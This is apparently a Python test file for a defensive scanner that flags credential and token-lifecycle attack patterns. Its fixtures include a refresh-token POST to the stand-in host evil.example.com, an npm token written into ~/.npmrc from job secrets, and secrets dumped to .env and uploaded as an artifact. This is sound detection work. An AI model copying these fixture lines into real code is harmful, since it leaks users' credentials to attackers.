"""Tests for scripts/lib/credential_lifecycle_patterns.py.

Pattern-coverage tests for the credential/token-lifecycle attack-pattern
catalogue (Wave 16 impl-m). Every rule has at least one positive test
and at least one negative test. Helper-function rules (issuer mismatch,
OAuth state, format mismatch, AST revoke suppression, mint-without-
revoke YAML walk, dispatch+artifact YAML walk) are tested through their
dedicated helper functions; pure regex rules are tested through
scan_text() / scan_all().
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import credential_lifecycle_patterns as clp  # type: ignore[import-not-found]  # noqa: E402
from _fake_secrets import secret  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple (immutable) and contain every advertised rule id."""
    assert isinstance(clp.RULES, tuple)
    rule_ids = {r.id for r in clp.RULES}
    expected = {
        "refresh-token-written-to-disk",
        "refresh-token-written-to-disk-reverse",
        "refresh-token-sent-to-non-issuer-url",
        "oauth-state-param-missing",
        "oidc-nonce-missing",
        "revoke-error-suppressed-shell",
        "revoke-error-suppressed-shell-reverse",
        "npmrc-pypirc-token-injection-from-job-env",
        "npmrc-pypirc-token-injection-from-job-env-reverse",
    }
    assert expected.issubset(rule_ids), expected - rule_ids


def test_every_rule_has_owasp_mapping() -> None:
    """Every Rule must declare a non-empty OWASP-ASI mapping and a
    catalogue-conformant severity string."""
    for rule in clp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MAJOR", "MINOR"}, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding is a NamedTuple with the exact field set the heartbeat
    detector expects (same shape as agent_config_patterns.Finding)."""
    f = clp.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-04",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-04"


# ---------- helper -------------------------------------------------------


def _ids(findings: list) -> set[str]:
    return {f.rule_id for f in findings}


# ---------- P2: refresh-token-written-to-disk ----------------------------


def test_refresh_token_python_open_write() -> None:
    """Python open(path, 'w') with a refresh_token JSON dump is the
    canonical at-rest persistence shape."""
    src = (
        "with open('token.json', 'w') as f:\n"
        "    json.dump({'access_token': at, 'refresh_token': rt}, f)\n"
    )
    findings = clp.scan_text(src)
    # Either forward or reverse rule must fire (both shapes apply here).
    fired = _ids(findings)
    assert (
        "refresh-token-written-to-disk" in fired
        or "refresh-token-written-to-disk-reverse" in fired
    ), fired


def test_refresh_token_node_writefilesync() -> None:
    """Node `fs.writeFileSync('creds.json', JSON.stringify({...,
    refresh_token: rt}))` should fire."""
    src = (
        "fs.writeFileSync('creds.json', JSON.stringify({"
        "access_token: at, refresh_token: rt}));\n"
    )
    fired = _ids(clp.scan_text(src))
    assert (
        "refresh-token-written-to-disk" in fired
        or "refresh-token-written-to-disk-reverse" in fired
    ), fired


def test_refresh_token_logger_info_call() -> None:
    """Refresh-token within 200 chars of a logger sink must fire."""
    src = "logger.info(f'tokens received: refresh_token={rt}')\n"
    fired = _ids(clp.scan_text(src))
    assert (
        "refresh-token-written-to-disk" in fired
        or "refresh-token-written-to-disk-reverse" in fired
    ), fired


def test_refresh_token_no_sink_no_finding() -> None:
    """A documentation-only mention of refresh_token with no write sink
    must NOT fire (negative)."""
    src = (
        "# This module handles OAuth refresh_token rotation but never\n"
        "# persists the token outside the in-memory cache.\n"
    )
    fired = _ids(clp.scan_text(src))
    assert "refresh-token-written-to-disk" not in fired, fired
    assert "refresh-token-written-to-disk-reverse" not in fired, fired


def test_refresh_token_read_only_no_finding() -> None:
    """Reading a refresh_token (open mode 'r') is NOT persistence —
    negative case."""
    src = (
        "with open('token.json', 'r') as f:\n"
        "    data = json.load(f)\n"
        "    rt = data['refresh_token']\n"
    )
    fired = _ids(clp.scan_text(src))
    assert "refresh-token-written-to-disk" not in fired, fired


# ---------- P3: refresh-token-sent-to-non-issuer-url ---------------------


def test_refresh_token_exfil_mismatch_fires() -> None:
    """Module declares issuer = oauth2.googleapis.com but POSTs a
    refresh_token to evil.example.com — must fire."""
    src = (
        "TOKEN_URL = 'https://oauth2.googleapis.com/token'\n"
        "requests.post('https://evil.example.com/collect',\n"
        "    data={'refresh_token': rt, 'client_id': 'x'})\n"
    )
    findings = clp.find_refresh_token_exfil(src)
    assert len(findings) == 1, findings
    assert findings[0].rule_id == "refresh-token-sent-to-non-issuer-url"
    assert "evil.example.com" in findings[0].matched_text


def test_refresh_token_exfil_matching_issuer_no_finding() -> None:
    """POST to the same host that's declared as the issuer is a legitimate
    refresh — negative."""
    src = (
        "TOKEN_URL = 'https://oauth2.googleapis.com/token'\n"
        "requests.post('https://oauth2.googleapis.com/token',\n"
        "    data={'refresh_token': rt})\n"
    )
    assert clp.find_refresh_token_exfil(src) == []


def test_refresh_token_exfil_no_issuer_constant_no_finding() -> None:
    """Without an issuer constant declared in the same module we cannot
    decide mismatch deterministically — return [] rather than guess."""
    src = (
        "requests.post('https://evil.example.com/collect',\n"
        "    data={'refresh_token': rt})\n"
    )
    assert clp.find_refresh_token_exfil(src) == []


# ---------- P4: oauth-state-param-missing --------------------------------


def test_oauth_state_missing_fires() -> None:
    """OAuth authorize URL build with no `state` in the window — fires."""
    src = (
        "url = ('https://accounts.example.com/oauth/authorize'\n"
        "    '?response_type=code&client_id=abc&redirect_uri=' + cb)\n"
        "return url\n"
    )
    fired = _ids(clp.find_oauth_state_missing(src))
    assert "oauth-state-param-missing" in fired


def test_oauth_state_present_no_finding() -> None:
    """Builder includes a literal `state=<value>` — negative case.

    The regex requires 4+ non-quote/space chars after `state=`, so the
    test fixture inlines a real state literal rather than splitting it
    across a Python string concatenation."""
    src = (
        "url = 'https://accounts.example.com/oauth/authorize"
        "?response_type=code&client_id=abc&state=abc123xyz789'\n"
    )
    assert clp.find_oauth_state_missing(src) == []


def test_oidc_nonce_missing_fires() -> None:
    """OpenID Connect builder (scope includes `openid`) without `nonce`
    must fire `oidc-nonce-missing` AND `oauth-state-param-missing`
    (the latter because there's also no state)."""
    src = (
        "url = ('https://accounts.example.com/oauth2/v2/auth'\n"
        "    '?response_type=code&scope=openid+email&client_id=abc')\n"
    )
    fired = _ids(clp.find_oauth_state_missing(src))
    assert "oidc-nonce-missing" in fired
    assert "oauth-state-param-missing" in fired


def test_oidc_with_nonce_only_state_missing() -> None:
    """OIDC builder with nonce but no state — only `oauth-state-param-
    missing` should fire."""
    src = (
        "url = ('https://accounts.example.com/oauth2/v2/auth'\n"
        "    '?response_type=code&scope=openid&nonce=abc123xyz&client_id=c')\n"
    )
    fired = _ids(clp.find_oauth_state_missing(src))
    assert "oidc-nonce-missing" not in fired
    assert "oauth-state-param-missing" in fired


# ---------- P6: revoke-error-suppressed (shell + python) -----------------


def test_revoke_suppressed_shell_or_true() -> None:
    """`gh auth token --revoke "$T" || true` must fire."""
    src = 'gh api -X DELETE /installation/token --revoke "$T" || true\n'
    fired = _ids(clp.scan_text(src))
    assert (
        "revoke-error-suppressed-shell" in fired
        or "revoke-error-suppressed-shell-reverse" in fired
    ), fired


def test_revoke_suppressed_aws_devnull() -> None:
    """`aws iam delete-access-key ... 2>/dev/null` must fire."""
    src = "aws iam delete-access-key --access-key-id AKIAFOO 2>/dev/null\n"
    fired = _ids(clp.scan_text(src))
    assert (
        "revoke-error-suppressed-shell" in fired
        or "revoke-error-suppressed-shell-reverse" in fired
    ), fired


def test_revoke_not_suppressed_no_finding() -> None:
    """Revoke without `|| true` / `2>/dev/null` is fine — negative."""
    src = 'gh api -X DELETE /installation/token --revoke "$T"\n'
    fired = _ids(clp.scan_text(src))
    assert "revoke-error-suppressed-shell" not in fired


def test_revoke_suppression_python_bare_except() -> None:
    """Python try/except wrapping `session.revoke()` with `pass`-only
    body fires the AST rule."""
    src = (
        "def cleanup(session):\n"
        "    try:\n"
        "        session.revoke()\n"
        "    except Exception:\n"
        "        pass\n"
    )
    findings = clp.find_revoke_suppression_python(src)
    assert any(
        f.rule_id == "revoke-error-suppressed-python" for f in findings
    ), findings


def test_revoke_suppression_python_with_logging_no_finding() -> None:
    """A try/except that LOGS the failure is not silent — negative."""
    src = (
        "def cleanup(session):\n"
        "    try:\n"
        "        session.revoke()\n"
        "    except Exception as exc:\n"
        "        logger.error('revoke failed: %s', exc)\n"
        "        raise\n"
    )
    assert clp.find_revoke_suppression_python(src) == []


def test_revoke_suppression_python_unrelated_call_no_finding() -> None:
    """A try/except over a non-revoke call must NOT fire — the rule is
    specific to credential lifecycle."""
    src = (
        "try:\n"
        "    do_unrelated_work()\n"
        "except Exception:\n"
        "    pass\n"
    )
    assert clp.find_revoke_suppression_python(src) == []


# ---------- P7: token-format-mismatch-in-secret-write --------------------


def test_token_format_mismatch_aws_into_github() -> None:
    """AWS-shaped literal `AKIAxxxx...` written into `GITHUB_TOKEN`
    must fire as a mismatch."""
    src = 'export GITHUB_TOKEN="AKIAIOSFODNN7EXAMPLE"\n'
    findings = clp.find_token_format_mismatch(src)
    assert any(
        f.rule_id == "token-format-mismatch-in-secret-write" for f in findings
    ), findings


def test_token_format_match_github_into_github_no_finding() -> None:
    """`ghp_…` literal into `GITHUB_TOKEN` is the expected prefix — no
    finding."""
    src = f'export GITHUB_TOKEN="{secret("ghp" + "_", "clp-ghp-match1", 32)}"\n'
    assert clp.find_token_format_mismatch(src) == []


def test_token_format_substitution_no_finding() -> None:
    """`NPM_TOKEN=${{ secrets.GITHUB_TOKEN }}` is a legitimate cross-
    provider routing pattern — must NOT fire (the value is a workflow
    expression, not a literal)."""
    src = "NPM_TOKEN=${{ secrets.GITHUB_TOKEN }}\n"
    assert clp.find_token_format_mismatch(src) == []


# ---------- P8: npmrc-pypirc-token-injection-from-job-env ----------------


def test_npmrc_injection_secret_into_npmrc_fires() -> None:
    """`echo "//registry.npmjs.org/:_authToken=${{ secrets.NPM_TOKEN }}"
    >> ~/.npmrc` is the canonical Shai-Hulud persistence shape."""
    src = (
        'echo "//registry.npmjs.org/:_authToken=${{ secrets.NPM_TOKEN }}"'
        ' >> ~/.npmrc\n'
    )
    fired = _ids(clp.scan_text(src))
    assert (
        "npmrc-pypirc-token-injection-from-job-env" in fired
        or "npmrc-pypirc-token-injection-from-job-env-reverse" in fired
    ), fired


def test_npmrc_injection_env_token_into_pypirc_fires() -> None:
    """`$PYPI_TOKEN` written via tee into `~/.pypirc` must fire."""
    src = 'echo "[pypi]\\npassword = $PYPI_TOKEN" | tee ~/.pypirc\n'
    fired = _ids(clp.scan_text(src))
    assert (
        "npmrc-pypirc-token-injection-from-job-env" in fired
        or "npmrc-pypirc-token-injection-from-job-env-reverse" in fired
    ), fired


def test_npmrc_injection_no_creds_file_no_finding() -> None:
    """Writing `NPM_TOKEN=$X` into a generic file (not a credentials
    file) is NOT the rule's target — negative."""
    src = 'echo "NPM_TOKEN=${NPM_TOKEN}" > /tmp/notes.txt\n'
    fired = _ids(clp.scan_text(src))
    assert "npmrc-pypirc-token-injection-from-job-env" not in fired


def test_npmrc_injection_no_secret_no_finding() -> None:
    """Writing a literal placeholder into `~/.npmrc` is benign — there's
    no env/secret reference, so no finding."""
    src = 'echo "//registry.npmjs.org/:_authToken=PLACEHOLDER" >> ~/.npmrc\n'
    fired = _ids(clp.scan_text(src))
    assert "npmrc-pypirc-token-injection-from-job-env" not in fired


# ---------- P1: token-create-without-revoke-pair (YAML walk) -------------


def test_mint_without_revoke_vault() -> None:
    """A job that calls `vault token create` but never revokes — fires."""
    wf = {
        "jobs": {
            "publish": {
                "steps": [
                    {"run": "vault token create -ttl=1h > /tmp/tok"},
                    {"run": "use_token_for_publish.sh"},
                ],
            },
        },
    }
    findings = clp.find_mint_without_revoke(wf)
    assert any(
        f.rule_id == "token-create-without-revoke-pair" for f in findings
    ), findings


def test_mint_with_revoke_no_finding() -> None:
    """Same shape with `vault token revoke` step — negative."""
    wf = {
        "jobs": {
            "publish": {
                "steps": [
                    {"run": "vault token create -ttl=1h > /tmp/tok"},
                    {"run": "use_token_for_publish.sh"},
                    {"run": "vault token revoke -self"},
                ],
            },
        },
    }
    assert clp.find_mint_without_revoke(wf) == []


def test_mint_sts_without_revoke() -> None:
    """`aws sts assume-role` without a `delete-access-key` follow-up
    fires the rule (STS branch of the generalisation)."""
    wf = {
        "jobs": {
            "deploy": {
                "steps": [
                    {"run": "aws sts assume-role --role-arn arn:aws:iam::123:role/X"},
                    {"run": "aws s3 cp ..."},
                ],
            },
        },
    }
    findings = clp.find_mint_without_revoke(wf)
    assert any(
        f.rule_id == "token-create-without-revoke-pair" for f in findings
    ), findings


# ---------- P5: credential-survives-workflow-dispatch-via-artifact -------


def test_dispatch_artifact_survival_default_retention_fires() -> None:
    """workflow_dispatch + secret usage + upload-artifact with no
    retention override (defaults to 90 days) must fire."""
    wf = {
        "on": ["workflow_dispatch"],
        "jobs": {
            "export": {
                "steps": [
                    {
                        "env": {"NPM_TOKEN": "${{ secrets.NPM_TOKEN }}"},
                        "run": 'echo "$NPM_TOKEN" > .env',
                    },
                    {
                        "uses": "actions/upload-artifact@v4",
                        "with": {"name": "env-file", "path": ".env"},
                    },
                ],
            },
        },
    }
    findings = clp.find_dispatch_artifact_survival(wf)
    assert any(
        f.rule_id == "credential-survives-workflow-dispatch-via-artifact"
        for f in findings
    ), findings


def test_dispatch_artifact_short_retention_no_finding() -> None:
    """Same shape but with `retention-days: 1` — the operator explicitly
    chose a short window, so no finding."""
    wf = {
        "on": ["workflow_dispatch"],
        "jobs": {
            "export": {
                "steps": [
                    {
                        "env": {"NPM_TOKEN": "${{ secrets.NPM_TOKEN }}"},
                        "run": 'echo "$NPM_TOKEN" > .env',
                    },
                    {
                        "uses": "actions/upload-artifact@v4",
                        "with": {
                            "name": "env-file",
                            "path": ".env",
                            "retention-days": 1,
                        },
                    },
                ],
            },
        },
    }
    assert clp.find_dispatch_artifact_survival(wf) == []


def test_dispatch_no_secrets_no_finding() -> None:
    """workflow_dispatch + upload-artifact but NO secret references in
    the job — negative."""
    wf = {
        "on": ["workflow_dispatch"],
        "jobs": {
            "export": {
                "steps": [
                    {"run": "echo hello > out.txt"},
                    {
                        "uses": "actions/upload-artifact@v4",
                        "with": {"name": "out", "path": "out.txt"},
                    },
                ],
            },
        },
    }
    assert clp.find_dispatch_artifact_survival(wf) == []


def test_push_trigger_only_no_finding() -> None:
    """workflow has secret + upload-artifact but trigger is `push` only
    — outside this rule's scope (which targets dispatch-only)."""
    wf = {
        "on": ["push"],
        "jobs": {
            "export": {
                "steps": [
                    {
                        "env": {"NPM_TOKEN": "${{ secrets.NPM_TOKEN }}"},
                        "run": 'echo "$NPM_TOKEN" > .env',
                    },
                    {
                        "uses": "actions/upload-artifact@v4",
                        "with": {"name": "env-file", "path": ".env"},
                    },
                ],
            },
        },
    }
    assert clp.find_dispatch_artifact_survival(wf) == []


# ---------- scan_all() composite -----------------------------------------


def test_scan_all_aggregates_helpers() -> None:
    """scan_all() runs scan_text + every text-mode helper. A source
    that simultaneously triggers refresh-token-to-disk AND oauth-state-
    missing should surface both findings in one call."""
    src = (
        "TOKEN_URL = 'https://oauth2.googleapis.com/token'\n"
        "url = ('https://accounts.example.com/oauth/authorize'\n"
        "    '?response_type=code&client_id=abc')\n"
        "with open('token.json', 'w') as f:\n"
        "    json.dump({'refresh_token': rt}, f)\n"
    )
    fired = _ids(clp.scan_all(src))
    assert "oauth-state-param-missing" in fired
    # at least one of the two refresh-disk shapes
    assert (
        "refresh-token-written-to-disk" in fired
        or "refresh-token-written-to-disk-reverse" in fired
    )


def test_scan_all_empty_input() -> None:
    """Empty text returns empty list, not None / no crash."""
    assert clp.scan_all("") == []
    assert clp.scan_text("") == []


# ---------- Helper module sanity -----------------------------------------


def test_revoke_python_handles_unparseable() -> None:
    """A non-Python text (shell script) must return [] without raising."""
    src = "#!/usr/bin/env bash\nset -e\ngh auth revoke\n"
    assert clp.find_revoke_suppression_python(src) == []
